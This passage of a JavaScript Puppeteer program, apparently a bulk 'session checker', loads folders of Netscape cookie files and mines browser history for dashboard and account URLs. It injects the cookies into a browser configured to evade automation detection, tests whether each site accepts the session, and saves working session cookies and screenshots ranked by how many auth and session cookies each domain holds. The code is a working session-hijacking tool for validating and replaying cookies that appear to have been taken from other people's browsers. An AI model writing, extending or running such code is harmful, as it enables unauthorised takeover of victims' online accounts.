      // Fallback: create a new page if none exist
      page = await browser.newPage();
      console.log(`🔧 Created new browser tab`);
    }
    
    // Process domains with T-1 preparation phase and optimal timing
    for (const [domain, data] of domains) {
      current++;
      displayProgress(current, domains.length, domain);
      
      // Initialize detailed session logger
      const sessionLogger = new SessionLogger(domain);
      
      try {
        // Get optimal test URL using history intelligence
        const testUrl = await getTestURL(domain, cookieDir);
        
        // T-1 PREPARATION PHASE: Close all active tabs for target domain
        console.log(`\n🔍 T-1 PREPARATION: Starting ${domain}`);
        console.log(`  📍 Target URL: ${testUrl}`);
        console.log(`  🍪 Cookies to inject: ${data.cookies.length}`);
        
        sessionLogger.logEvent('SESSION_START', {
          summary: `Starting session test for ${domain}`,
          targetUrl: testUrl,
          cookieCount: data.cookies.length
        });
        
        // Clear all cookies before testing each domain to ensure isolation
        const existingCookies = await page.cookies();
        if (existingCookies.length > 0) {
          console.log(`  🧹 T-1: Clearing ${existingCookies.length} existing cookies for fresh start...`);
          await page.deleteCookie(...existingCookies);
          
          sessionLogger.logEvent('COOKIE_CLEANUP', {
            summary: `Cleared ${existingCookies.length} existing cookies`,
            clearedCount: existingCookies.length
          });
        }
        
        // Set user agent to avoid detection
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        // T-1: CRITICAL TIMING - Inject cookies BEFORE any request to ensure immediate authentication
        console.log(`  ⚡ T-1 CRITICAL: Pre-injecting ${data.cookies.length} cookies with optimal timing...`);
        
        // Step 1: Navigate to domain root to establish context (minimal request)
        const domainRoot = `https://${domain}/`;
        console.log(`  📍 T-1: Establishing domain context at ${domainRoot}`);
        
        try {
          // Use fastest possible navigation to establish domain context with logging
          sessionLogger.logEvent('DOMAIN_CONTEXT_START', {
            summary: `Establishing context at ${domainRoot}`,
            url: domainRoot
          });
          
          await navigateWithLogging(page, domainRoot, { 
            waitUntil: "domcontentloaded", 
            timeout: CONFIG.pageTimeout 
          }, sessionLogger);
          
          console.log(`  ✅ T-1: Domain context established - ready for cookie injection`);
          sessionLogger.logEvent('DOMAIN_CONTEXT_SUCCESS', {
            summary: 'Domain context established successfully'
          });
          
          // Step 2: CRITICAL TIMING - Inject cookies immediately after domain context
          console.log(`  🍪 T-1 CRITICAL: Injecting cookies NOW with timing optimization...`);
          const cookiesSet = await setCookiesWithTiming(page, domain, data.cookies, sessionLogger);
          
          // Step 3: Verify cookies were injected successfully
          const cookiesAfterInjection = await page.cookies();
          console.log(`  📊 T-1 SUCCESS: ${cookiesAfterInjection.length} cookies active and ready`);
          console.log(`  🔍 T-1 Verification - Injected cookies:`);
          
          sessionLogger.logEvent('COOKIE_VERIFICATION', {
            summary: `${cookiesAfterInjection.length} cookies verified active`,
            activeCount: cookiesAfterInjection.length,
            expectedCount: cookiesSet
          });
          
          // Show critical session cookies first
          const sessionCookies = cookiesAfterInjection.filter(cookie => 
            cookie.name.toLowerCase().includes('session') || 
            cookie.name.toLowerCase().includes('auth') ||
            cookie.name.toLowerCase().includes('token') ||
            cookie.name.toLowerCase().includes('login')
          );
          
          if (sessionCookies.length > 0) {
            console.log(`  🔑 Critical session cookies (${sessionCookies.length}):`);
            sessionCookies.forEach((cookie, index) => {
              console.log(`    ${index + 1}. ${cookie.name}=${cookie.value.slice(0, 30)}... (${cookie.domain})`);
            });
            
            sessionLogger.logEvent('CRITICAL_COOKIES_FOUND', {
              summary: `${sessionCookies.length} critical session cookies active`,
              sessionCookieCount: sessionCookies.length,
              sessionCookieNames: sessionCookies.map(c => c.name)
            });
          }
          
          // Show first few other cookies
          const otherCookies = cookiesAfterInjection.filter(cookie => 
            !sessionCookies.includes(cookie)
          );
          if (otherCookies.length > 0) {
            console.log(`  📄 Other cookies (${otherCookies.length}):`);
            otherCookies.slice(0, 3).forEach((cookie, index) => {
              console.log(`    ${index + 1}. ${cookie.name}=${cookie.value.slice(0, 20)}... (${cookie.domain})`);
            });
            if (otherCookies.length > 3) {
              console.log(`    ... and ${otherCookies.length - 3} more cookies`);
            }
          }
          
          // Step 4: T+0 CRITICAL - Navigate to authenticated endpoint with hard refresh
          console.log(`  ⚡ T+0 CRITICAL: Performing hard refresh navigation to ${testUrl}`);
          console.log(`  🎯 Goal: Server must see injected cookies in FIRST request`);
          
          sessionLogger.logEvent('AUTHENTICATED_NAVIGATION_START', {
            summary: `Navigating to authenticated endpoint: ${testUrl}`,
            targetUrl: testUrl,
            cookiesReady: cookiesAfterInjection.length
          });
          
          // Use navigation with logging to capture response details
          await navigateWithLogging(page, testUrl, {
            waitUntil: "domcontentloaded",
            timeout: CONFIG.pageTimeout
          }, sessionLogger);
          
          // Perform additional hard refresh to guarantee cookies are sent
          console.log(`  🔄 T+1: Performing hard refresh to ensure cookie recognition...`);
          await reloadWithLogging(page, { waitUntil: "domcontentloaded" }, sessionLogger);
          
          // Final verification that cookies persisted through navigation
          const cookiesAfterNavigation = await page.cookies();
          console.log(`  📊 T+1 VERIFICATION: ${cookiesAfterNavigation.length} cookies still active after navigation`);
          
          sessionLogger.logEvent('POST_NAVIGATION_VERIFICATION', {
            summary: `${cookiesAfterNavigation.length} cookies remain after navigation`,
            remainingCount: cookiesAfterNavigation.length,
            originalCount: cookiesAfterInjection.length
          });
          
          // Check if any critical cookies were lost
          const currentSessionCookies = cookiesAfterNavigation.filter(cookie => 
            cookie.name.toLowerCase().includes('session') || 
            cookie.name.toLowerCase().includes('auth') ||
            cookie.name.toLowerCase().includes('token') ||
            cookie.name.toLowerCase().includes('login')
          );
          
          if (currentSessionCookies.length === 0 && sessionCookies.length > 0) {
            console.log(`  ⚠️  WARNING: Critical session cookies were lost during navigation!`);
            sessionLogger.logEvent('CRITICAL_COOKIES_LOST', {
              summary: 'Critical session cookies lost during navigation',
              originalCount: sessionCookies.length,
              remainingCount: currentSessionCookies.length
            });
          } else if (currentSessionCookies.length > 0) {
            console.log(`  ✅ T+1 SUCCESS: ${currentSessionCookies.length} critical session cookies maintained`);
            sessionLogger.logEvent('CRITICAL_COOKIES_MAINTAINED', {
              summary: `${currentSessionCookies.length} critical cookies maintained`,
              maintainedCount: currentSessionCookies.length
            });
          }
          
          console.log(`  🎉 T+1 COMPLETE: Optimal timing cookie injection process finished!`);
          
        } catch (navigationError) {
          console.warn(`  ⚠️  T-1 Navigation Warning: ${navigationError.message}`);
          console.log(`  🔄 T-1 Fallback: Attempting direct injection on current page...`);
          
          sessionLogger.logEvent('NAVIGATION_ERROR', {
            summary: `Navigation failed: ${navigationError.message}`,
            error: navigationError.message,
            fallbackUsed: true
          });
          
          // Fallback: try to inject cookies directly without navigation
          const cookiesSet = await setCookiesWithTiming(page, domain, data.cookies, sessionLogger);
          console.log(`  📦 T-1 Fallback complete: ${cookiesSet} cookies injected`);
        }
        
        // Step 5: T+2 Wait for dynamic content and session confirmation
        console.log(`  ⏳ T+2: Allowing time for session confirmation and dynamic content...`);
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        sessionLogger.logEvent('DYNAMIC_CONTENT_WAIT', {
          summary: 'Waiting for dynamic content and session confirmation'
        });
        
        let loginResult;
        let manualOverride = false;
        
        if (mode === "2") {
          // Auto mode
          loginResult = await checkLoginStatus(page, domain);
        } else if (mode === "3") {
          // Mixed mode - auto first, then manual for uncertain cases
          loginResult = await checkLoginStatus(page, domain);
          
          if (loginResult.confidence < 70) {
            // Mixed mode - ask for uncertain cases
            console.log(`\n\n❓ Uncertain result for ${domain} (confidence: ${loginResult.confidence}%)`);
            console.log(`   URL: ${testUrl}`);
            let answer;
            while (true) {
              answer = (await ask("Manual check - is this logged in? (y/n/s=skip): ")).toLowerCase();
              if (["y", "n", "s"].includes(answer)) break;
              console.log("Please enter 'y', 'n', or 's'.");
            }
            if (answer !== "s") {
              loginResult.loggedIn = answer === "y";
              loginResult.confidence = 100;
              manualOverride = true;
            }
          }
        } else {
          // This shouldn't happen since mode 1 and 4 are handled earlier
          loginResult = await checkLoginStatus(page, domain);
        }
        
        // Log final session status
        sessionLogger.logSessionStatus(
          loginResult.loggedIn ? 'VALID_SESSION' : 'INVALID_SESSION',
          loginResult.confidence,
          loginResult.indicators
        );
        
        // Record result with enhanced timing data
        const sessionSummary = sessionLogger.generateSummary();
        const result = {
          domain,
          loggedIn: loginResult.loggedIn,
          confidence: loginResult.confidence,
          indicators: loginResult.indicators,
          file: data.file,
          cookiesCount: data.cookies.length,
          cookiesSet: sessionSummary.cookieStats.totalInjected, // Use value from session summary
          testUrl,
          manualOverride,
          timestamp: new Date().toISOString(),
          // Enhanced timing and logging data
          sessionTiming: sessionSummary.timings,
          cookieStats: sessionSummary.cookieStats,
          httpStats: sessionSummary.httpStats,
          sessionEvents: sessionSummary.events?.length || sessionLogger.events.length
        };
        
        results.push(result);
        
        if (loginResult.loggedIn) {
          // Save valid session
          const logLine = `${new Date().toISOString()} | ✅ VALID | ${domain} | Confidence: ${loginResult.confidence}% | Timing: ${sessionSummary.totalTime}ms | Cookies: ${sessionSummary.cookieStats.totalInjected} | ${data.file}\n`;
          logStream.write(logLine);
          
          const savedPath = await writeNetscapeCookieFile(domain, data.cookies, outputDir);
          
          // Save detailed session log
          if (CONFIG.detailedLogging) {
            const sessionLogPath = path.join(outputDir, `${domain}_session_log.json`);
            await fs.promises.writeFile(sessionLogPath, JSON.stringify(sessionLogger.exportLogs(), null, 2));
          }
          
          // Take screenshot if configured
          if (CONFIG.screenshotOnSuccess) {
            const screenshotPath = path.join(screenshotDir, `${domain.replace(/[^a-z0-9]/gi, '_')}.png`);
            await page.screenshot({ path: screenshotPath, fullPage: false });
          }
          
          console.log(`\n✅ Valid session: ${domain} (${loginResult.confidence}% confidence) - Timing: ${sessionSummary.totalTime}ms`);
        } else {
          const logLine = `${new Date().toISOString()} | ❌ INVALID | ${domain} | Confidence: ${loginResult.confidence}% | Timing: ${sessionSummary.totalTime}ms | Cookies: ${sessionSummary.cookieStats.totalInjected} | ${data.file}\n`;
          logStream.write(logLine);
          
          // Save detailed session log for failed sessions too (for debugging)
          if (CONFIG.detailedLogging) {
            const sessionLogPath = path.join(outputDir, `${domain}_failed_session_log.json`);
            await fs.promises.writeFile(sessionLogPath, JSON.stringify(sessionLogger.exportLogs(), null, 2));
          }
          
          console.log(`\n❌ Invalid session: ${domain} - Timing: ${sessionSummary.totalTime}ms`);
        }
        
      } catch (e) {
        console.error(`\n❌ Error testing ${domain}: ${e.message}`);
        
        // Log error in session logger if available
        if (sessionLogger) {
          sessionLogger.logEvent('FATAL_ERROR', {
            summary: `Fatal error: ${e.message}`,
            error: e.message,
            stack: e.stack
          });
        }
        
        const errorResult = {
          domain,
          error: e.message,
          file: data.file,
          timestamp: new Date().toISOString(),
          sessionTiming: sessionLogger ? sessionLogger.generateSummary().timings : null
        };
        results.push(errorResult);
        
        const logLine = `${new Date().toISOString()} | ❌ ERROR | ${domain} | ${e.message} | ${data.file}\n`;
        logStream.write(logLine);
        
        // Save error session log
        if (CONFIG.detailedLogging && sessionLogger) {
          const errorLogPath = path.join(outputDir, `${domain}_error_log.json`);
          await fs.promises.writeFile(errorLogPath, JSON.stringify(sessionLogger.exportLogs(), null, 2)).catch(() => {});
        }
      }
      // No need to close page since we're reusing it
    }
    
    // Close the page at the end
    if (page) {
      await page.close().catch(() => {});
    }
    
    console.log(`\n\n🎉 Processing complete!`);
    
    // Summary
    const validSessions = results.filter(r => r.loggedIn).length;
    const invalidSessions = results.filter(r => r.loggedIn === false).length;
    const errors = results.filter(r => r.error).length;
    
    console.log(`\n📊 Summary:`);
    console.log(`   Total domains processed: ${results.length}`);
    console.log(`   ✅ Valid sessions: ${validSessions}`);
    console.log(`   ❌ Invalid sessions: ${invalidSessions}`);
    console.log(`   ⚠️  Errors: ${errors}`);
    console.log(`   ⏱️  Total time: ${Math.round((Date.now() - startTime) / 1000)}s`);
    
    logStream.write(`\n=== Session Check Completed: ${new Date().toISOString()} ===\n`);
    logStream.write(`Summary: ${validSessions} valid, ${invalidSessions} invalid, ${errors} errors\n`);
    logStream.end();
    
    // Export JSON results if configured
    if (CONFIG.exportJson) {
      await exportResults(results);
    }
    
    console.log(`\n📄 Enhanced log saved to: ${logPath}`);
    console.log(`📁 Valid cookies saved to: ${outputDir}`);
    
  } catch (e) {
    console.error("\n💥 Fatal error:", e);
    if (browser) {
      await browser.close().catch(() => {});
    }
    process.exit(1);
  } finally {
    if (browser) {
      await browser.close().catch(() => {});
    }
    rl.close();
  }
}

/** Remove duplicates by picking newest file */
function deduplicateDomains(domainFiles) {
  const deduped = new Map();
  for (const [domain, files] of domainFiles.entries()) {
    files.sort((a, b) => b.mtime - a.mtime);
    deduped.set(domain, files[0]);
  }
  return deduped;
}

/** Get test URL for domain with history-based endpoint discovery */
async function getTestURL(domain, cookieDir = null) {
  // First check for history-based authenticated endpoints
  if (cookieDir) {
    try {
      const discoveredUrls = await findAuthenticatedEndpoints(cookieDir, domain);
      if (discoveredUrls.length > 0) {
        // Return the most promising discovered URL
        const bestUrl = discoveredUrls.find(url => 
          url.includes('dashboard') || url.includes('profile') || url.includes('account')
        ) || discoveredUrls[0];
        
        console.log(`  🎯 T-1 INTEL: Using discovered authenticated endpoint: ${bestUrl}`);
        return bestUrl;
      }
    } catch (e) {
      console.log(`  ⚠️  T-1 INTEL: History scan failed, using default URL`);
    }
  }
  
  // Fallback to predefined or default URL
  const defaultUrl = DOMAIN_TEST_URLS[domain] || `https://${domain}/`;
  console.log(`  📍 T-1: Using predefined test URL: ${defaultUrl}`);
  return defaultUrl;
}

/** Write cookies to file */
async function writeNetscapeCookieFile(domain, cookies, outDir) {
  const outPath = path.join(outDir, `${domain}.txt`);
  const header = `# Netscape HTTP Cookie File\n# Generated by Enhanced Session Checker v2.0\n# Domain: ${domain}\n# Generated: ${new Date().toISOString()}\n\n`;
  await fs.promises.writeFile(outPath, header + cookies.join("\n") + "\n", "utf8");
  return outPath;
}

// -------------------------- Cookie Discovery & Preparation Mode --------------------------

/** Cookie discovery and preparation mode - gathers, validates, cross-references, and saves cookies */
async function runCookieDiscoveryMode() {
  console.log("\n🔍 COOKIE DISCOVERY & PREPARATION MODE");
  console.log("This mode will gather cookies, validate them, cross-reference with browser data,");
  console.log("and prepare them for testing in modes 2, 3, and 4.\n");
  
  try {
    // Cookie directory input
    let cookieDir;
    while (true) {
      const input = await ask("Enter the full path to the cookie directory: ");
      if (input && (await fs.promises.stat(input).catch(() => false))) {
        cookieDir = input;
        break;
      }
      console.log("Invalid directory. Please try again.");
    }
    
    console.log("\n🔍 Phase 1: Scanning for cookie files...");
    const cookieFiles = await findCookieFiles(cookieDir);
    if (cookieFiles.length === 0) {
      console.log("❌ No cookie files found in that directory.");
      return;
    }
    console.log(`✅ Found ${cookieFiles.length} cookie file(s).\n`);
    
    // Parse all cookie files and validate
    console.log("📝 Phase 2: Parsing and validating cookie files...");
    const domainFiles = new Map();
    const discoveryStats = {
      totalFiles: cookieFiles.length,
      totalDomains: 0,
      totalCookies: 0,
      validCookies: 0,
      expiredCookies: 0,
      malformedCookies: 0,
      authenticatedEndpoints: new Map()
    };
    
    for (const file of cookieFiles) {
      try {
        console.log(`  📄 Processing: ${path.basename(file)}`);
        const domainMap = await parseNetscapeCookies(file);
        const stats = await fs.promises.stat(file);
        
        for (const [domain, cookies] of domainMap.entries()) {
          if (!domainFiles.has(domain)) domainFiles.set(domain, []);
          domainFiles.get(domain).push({ file, mtime: stats.mtimeMs, cookies });
          
          discoveryStats.totalCookies += cookies.length;
          discoveryStats.validCookies += cookies.filter(c => !isCookieExpired(c)).length;
          discoveryStats.expiredCookies += cookies.filter(c => isCookieExpired(c)).length;
        }
        discoveryStats.totalDomains += domainMap.size;
      } catch (e) {
        console.warn(`  ❌ Failed to parse ${file}: ${e.message}`);
        discoveryStats.malformedCookies++;
      }
    }
    
    // Deduplicate domains (keep newest)
    const dedupedDomains = deduplicateDomains(domainFiles);
    console.log(`\n🎯 Found ${discoveryStats.totalDomains} total domains, ${dedupedDomains.size} unique domains after deduplication.`);
    
    console.log("\n📊 Phase 2 Results:");
    console.log(`   📂 Cookie files processed: ${discoveryStats.totalFiles}`);
    console.log(`   🌐 Unique domains: ${dedupedDomains.size}`);
    console.log(`   🍪 Total cookies: ${discoveryStats.totalCookies}`);
    console.log(`   ✅ Valid cookies: ${discoveryStats.validCookies}`);
    console.log(`   ⏰ Expired cookies: ${discoveryStats.expiredCookies}`);
    console.log(`   ❌ Malformed files: ${discoveryStats.malformedCookies}`);
    
    // Phase 3: Cross-reference with browser history
    console.log("\n🔗 Phase 3: Cross-referencing with browser history and data...");
    const endpointDiscoveryResults = new Map();
    
    let processedDomains = 0;
    for (const [domain, data] of dedupedDomains.entries()) {
      processedDomains++;
      console.log(`\n  [${processedDomains}/${dedupedDomains.size}] 🔍 Cross-referencing: ${domain}`);
      
      try {
        // Discover authenticated endpoints from browser history
        const discoveredEndpoints = await findAuthenticatedEndpoints(cookieDir, domain);
        
        // Analyze cookies for this domain
        const cookies = data.cookies;
        const sessionCookies = cookies.filter(c => {
          const name = c.split('\t')[5]?.toLowerCase() || '';
          return name.includes('session') || name.includes('auth') || name.includes('token');
        });
        
        const validCookies = cookies.filter(c => !isCookieExpired(c));
        
        const analysis = {
          domain,
          totalCookies: cookies.length,
          validCookies: validCookies.length,
          sessionCookies: sessionCookies.length,
          expiredCookies: cookies.length - validCookies.length,
          discoveredEndpoints: discoveredEndpoints,
          bestEndpoint: discoveredEndpoints.length > 0 ? 
            (discoveredEndpoints.find(url => url.includes('dashboard') || url.includes('profile') || url.includes('account')) || discoveredEndpoints[0])
            : DOMAIN_TEST_URLS[domain] || `https://${domain}/`,
          file: data.file,
          lastModified: new Date(data.mtime).toISOString(),
          priority: sessionCookies.length + (validCookies.length * 0.1) // Higher score for more session cookies
        };
        
        endpointDiscoveryResults.set(domain, analysis);
        
        console.log(`    🍪 Cookies: ${analysis.totalCookies} total, ${analysis.validCookies} valid, ${analysis.sessionCookies} session/auth`);
        console.log(`    🌐 Endpoints: ${analysis.discoveredEndpoints.length} discovered`);
        console.log(`    🎯 Best endpoint: ${analysis.bestEndpoint}`);
        
      } catch (e) {
        console.warn(`    ⚠️  Error cross-referencing ${domain}: ${e.message}`);
      }
    }
    
    // Phase 4: Save prepared cookies and analysis
    console.log("\n💾 Phase 4: Saving prepared cookies and analysis...");
    
    const preparedCookiesDir = "/home/admin/Desktop/CheckCookie/prepared_cookies";
    const analysisDir = "/home/admin/Desktop/CheckCookie/analysis";
    
    await fs.promises.mkdir(preparedCookiesDir, { recursive: true });
    await fs.promises.mkdir(analysisDir, { recursive: true });
    
    // Sort domains by priority (most promising first)
    const sortedDomains = Array.from(endpointDiscoveryResults.values())
      .sort((a, b) => b.priority - a.priority);
    
    let savedCount = 0;
    for (const analysis of sortedDomains) {
      try {
        // Save valid cookies only
        const validCookieLines = dedupedDomains.get(analysis.domain).cookies
          .filter(c => !isCookieExpired(c));
        
        if (validCookieLines.length > 0) {
          // Sanitize domain name for filename
          const safeDomain = analysis.domain
            .replace(/[^\w\.-]/g, '_') // Replace invalid characters with underscore
            .substring(0, 100); // Limit length to prevent filename too long errors
          
          const cookieFilePath = path.join(preparedCookiesDir, `${safeDomain}.txt`);
          const header = `# Netscape HTTP Cookie File\n# Prepared by Cookie Discovery Mode\n# Domain: ${analysis.domain}\n# Valid cookies: ${validCookieLines.length}\n# Session/Auth cookies: ${analysis.sessionCookies}\n# Best endpoint: ${analysis.bestEndpoint}\n# Generated: ${new Date().toISOString()}\n\n`;
          
          await fs.promises.writeFile(cookieFilePath, header + validCookieLines.join("\n") + "\n", "utf8");
          savedCount++;
          
          console.log(`    ✅ Saved: ${safeDomain} (${validCookieLines.length} valid cookies)`);
        }
      } catch (e) {
        console.warn(`    ❌ Failed to save ${analysis.domain}: ${e.message}`);
      }
    }
    
    // Save comprehensive analysis report
    const analysisReport = {
      timestamp: new Date().toISOString(),
      cookieDirectory: cookieDir,
      discoveryStats,
      domainAnalysis: Object.fromEntries(endpointDiscoveryResults),
      prioritizedDomains: sortedDomains.slice(0, 20), // Top 20 most promising
      recommendations: {
        highPriorityDomains: sortedDomains.filter(d => d.priority > 2).slice(0, 10),
        endpointDiscoverySuccess: Array.from(endpointDiscoveryResults.values()).filter(d => d.discoveredEndpoints.length > 0).length,
        totalPreparedDomains: savedCount
      }
    };
    
    const analysisPath = path.join(analysisDir, "discovery_analysis.json");
    await fs.promises.writeFile(analysisPath, JSON.stringify(analysisReport, null, 2));
    
    // Save endpoint mapping for quick reference
    const endpointMapping = {};
    endpointDiscoveryResults.forEach((analysis, domain) => {
      endpointMapping[domain] = {
        bestEndpoint: analysis.bestEndpoint,
        discoveredEndpoints: analysis.discoveredEndpoints,
        priority: analysis.priority
      };
    });
    
    const endpointMappingPath = path.join(analysisDir, "endpoint_mapping.json");
    await fs.promises.writeFile(endpointMappingPath, JSON.stringify(endpointMapping, null, 2));
    
    // Summary
    console.log("\n" + "=".repeat(60));
    console.log("🎉 COOKIE DISCOVERY & PREPARATION COMPLETE!");
    console.log("=".repeat(60));
    
    console.log(`\n📊 Final Results:`);
    console.log(`   🌐 Domains analyzed: ${endpointDiscoveryResults.size}`);
    console.log(`   💾 Cookie files prepared: ${savedCount}`);
    console.log(`   🎯 High-priority domains: ${analysisReport.recommendations.highPriorityDomains.length}`);
    console.log(`   🔍 Endpoint discovery success: ${analysisReport.recommendations.endpointDiscoverySuccess} domains`);
    
    console.log(`\n📁 Files created:`);
    console.log(`   📂 Prepared cookies: ${preparedCookiesDir}`);
    console.log(`   📊 Analysis report: ${analysisPath}`);
    console.log(`   🌐 Endpoint mapping: ${endpointMappingPath}`);
    
    console.log(`\n🚀 Next steps:`);
    console.log(`   - Use mode 2 for automatic testing of prepared cookies`);
    console.log(`   - Use mode 3 for mixed automatic/manual testing`);
    console.log(`   - Use mode 4 for manual verification of results`);
    
    if (analysisReport.recommendations.highPriorityDomains.length > 0) {
      console.log(`\n🎯 Top priority domains to test:`);
      analysisReport.recommendations.highPriorityDomains.slice(0, 5).forEach((domain, index) => {
        console.log(`   ${index + 1}. ${domain.domain} (${domain.sessionCookies} session cookies, ${domain.validCookies} total)`);
      });
    }
    
  } catch (error) {
    console.error(`💥 Error in cookie discovery mode: ${error.message}`);
  }
}

// -------------------------- Cookie Verification Mode --------------------------

/** Manual verification mode for saved valid cookies */
async function runCookieVerificationMode() {
  console.log("\n🔍 COOKIE VERIFICATION MODE");
  console.log("This mode will load previously saved valid cookies and let you manually verify them.\n");
  
  const validCookiesDir = "/home/admin/Desktop/CheckCookie/valid_cookies";
  
  try {
    // Check if valid cookies directory exists
    const dirExists = await fs.promises.stat(validCookiesDir).catch(() => false);
    if (!dirExists) {
      console.log("❌ No valid cookies found. Run a session check first to find valid sessions.");
      return;
    }
    
    // Get list of saved cookie files
    const cookieFiles = await fs.promises.readdir(validCookiesDir);
    const validFiles = cookieFiles.filter(f => f.endsWith('.txt'));
    
    if (validFiles.length === 0) {
      console.log("❌ No valid cookie files found in the directory.");
      return;
    }
    
    console.log(`📁 Found ${validFiles.length} saved valid cookie file(s):`);
    validFiles.forEach((file, index) => {
      const domain = file.replace('.txt', '');
      console.log(`  ${index + 1}. ${domain}`);
    });
    
    console.log("\nYou can:");
    console.log("- Press Enter to verify all cookies");
    console.log("- Enter numbers (e.g., '1,3,5') to verify specific cookies");
    console.log("- Type 'exit' to return to main menu");
    
    const selection = await ask("\nWhat would you like to verify? ");
    
    if (selection.toLowerCase() === 'exit') {
      return;
    }
    
    let filesToVerify = [];
    if (selection.trim() === '') {
      // Verify all
      filesToVerify = validFiles;
    } else {
      // Parse selection
      const indices = selection.split(',').map(s => parseInt(s.trim()) - 1);
      filesToVerify = indices
        .filter(i => i >= 0 && i < validFiles.length)
        .map(i => validFiles[i]);
    }
    
    if (filesToVerify.length === 0) {
      console.log("❌ No valid selection made.");
      return;
    }
    
    console.log(`\n🚀 Starting verification of ${filesToVerify.length} cookie file(s)...\n`);
    
    // Launch browser for verification with enhanced configuration
    const browser = await puppeteer.launch({
      headless: false, // Always show browser for manual verification
      defaultViewport: null,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-web-security',
        '--disable-features=site-per-process',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions-except',
        '--disable-extensions',
        '--no-first-run',
        '--disable-default-apps',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding'
      ],
      ignoreDefaultArgs: ['--enable-automation'],
      ignoreHTTPSErrors: true,
    });
    
    const verificationResults = [];
    
    // Use existing pages instead of creating incognito contexts to avoid multiple windows
    const existingPages = await browser.pages();
    let page;
    if (existingPages.length > 0) {
      page = existingPages[0];
      console.log(`🔧 Using existing browser tab for verification (${existingPages.length} total tabs found)`);
    } else {
      page = await browser.newPage();
      console.log(`🔧 Created new browser tab for verification`);
    }
    
    try {
      for (let i = 0; i < filesToVerify.length; i++) {
        const fileName = filesToVerify[i];
        const domain = fileName.replace('.txt', '');
        const filePath = path.join(validCookiesDir, fileName);
        
        console.log(`\n[${i + 1}/${filesToVerify.length}] 🔍 Verifying: ${domain}`);
        
        try {
          // Clear all existing cookies before each verification to ensure isolation
          const existingCookies = await page.cookies();
          if (existingCookies.length > 0) {
            console.log(`   🧹 Clearing ${existingCookies.length} existing cookies for fresh start...`);
            await page.deleteCookie(...existingCookies);
          }
          
          // Read the saved cookie file
          const cookieContent = await fs.promises.readFile(filePath, 'utf8');
          const cookieLines = cookieContent.split('\n')
            .filter(line => line.trim() && !line.startsWith('#'));
          
          if (cookieLines.length === 0) {
            console.log(`   ⚠️  No valid cookies found in ${fileName}`);
            continue;
          }
          
          // Set viewport and headers
          await page.setViewport({ width: 1366, height: 768 });
          await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9'
          });
          
          // Set user agent
          await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
          
          // Determine the best URL to test
          const testUrl = await getTestURL(domain);
          
          console.log(`   📍 Target URL: ${testUrl}`);
          
          // CRITICAL: Inject cookies BEFORE navigating to ensure immediate authentication
          console.log(`   ⏳ Step 1: Pre-injecting cookies BEFORE navigation...`);
          
          // First, navigate to the domain root to establish the domain context for cookie setting
          const domainRoot = `https://${domain}/`;
          console.log(`   📍 Establishing domain context: ${domainRoot}`);
          await retryOperation(async () => {
            await page.goto(domainRoot, { 
              waitUntil: "domcontentloaded", 
              timeout: CONFIG.pageTimeout 
            });
          }, 3);
          
          // Now inject cookies while we're on the domain
          console.log(`   🍪 Pre-injecting ${cookieLines.length} cookies...`);
          const cookiesSet = await setCookies(page, domain, cookieLines);
          console.log(`   ✅ Successfully pre-injected: ${cookiesSet} cookies`);
          
          // NOW navigate to the actual test URL with cookies already present
          console.log(`   ⏳ Step 2: Navigating to ${testUrl} WITH pre-injected cookies...`);
          await retryOperation(async () => {
            await page.goto(testUrl, { 
              waitUntil: "domcontentloaded", 
              timeout: CONFIG.pageTimeout 
            });
          }, 3);
          
          // Wait for page to fully load
          await new Promise(resolve => setTimeout(resolve, 3000));
          
          // Bring browser to front and focus
          await page.bringToFront();
          
          console.log(`\n   👀 Please examine the page for domain: ${domain}`);
          console.log(`   📍 URL: ${testUrl}`);
          console.log(`   🔍 Look for signs of being logged in (dashboard, profile, account info, etc.)`);
          
          // Get manual verification
          let answer;
          while (true) {
            answer = (await ask(`\n   ❓ Is this a valid logged-in session? (y/n/s=skip): `)).toLowerCase();
            if (["y", "n", "s"].includes(answer)) break;
            console.log("   Please enter 'y' for yes, 'n' for no, or 's' to skip.");
          }
          
          const result = {
            domain,
            fileName,
            testUrl,
            cookiesSet,
            timestamp: new Date().toISOString()
          };
          
          if (answer === "y") {
            result.verified = true;
            result.status = "CONFIRMED VALID";
            console.log(`   ✅ ${domain} - CONFIRMED as valid session`);
          } else if (answer === "n") {
            result.verified = false;
            result.status = "CONFIRMED INVALID";
            console.log(`   ❌ ${domain} - CONFIRMED as invalid session`);
            
            // Ask if they want to delete the invalid cookie file
            const deleteAnswer = (await ask(`   🗑️  Delete invalid cookie file for ${domain}? (y/n): `)).toLowerCase();
            if (deleteAnswer === "y") {
              await fs.promises.unlink(filePath);
              result.deleted = true;
              console.log(`   🗑️  Deleted ${fileName}`);
            }
          } else {
            result.verified = null;
            result.status = "SKIPPED";
            console.log(`   ⏭️  ${domain} - SKIPPED`);
          }
          
          verificationResults.push(result);
          
          // Add a delay between verifications to avoid overwhelming the network
          if (i < filesToVerify.length - 1) {
            console.log(`   ⏳ Waiting 2 seconds before next verification...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
          }
          
        } catch (error) {
          console.error(`   ❌ Error verifying ${domain}: ${error.message}`);
          verificationResults.push({
            domain,
            fileName,
            error: error.message,
            status: "ERROR",
            timestamp: new Date().toISOString()
          });
        }
      }
      
      // Show summary
      console.log(`\n\n🎉 Verification Complete!`);
      console.log(`\n📊 Summary:`);
      
      const confirmed = verificationResults.filter(r => r.verified === true).length;
      const invalid = verificationResults.filter(r => r.verified === false).length;
      const skipped = verificationResults.filter(r => r.verified === null).length;
      const errors = verificationResults.filter(r => r.error).length;
      
      console.log(`   ✅ Confirmed valid: ${confirmed}`);
      console.log(`   ❌ Confirmed invalid: ${invalid}`);
      console.log(`   ⏭️  Skipped: ${skipped}`);
      console.log(`   ⚠️  Errors: ${errors}`);
      
      // Save verification results
      const verificationLogPath = "/home/admin/Desktop/CheckCookie/verification_results.json";
      const logData = {
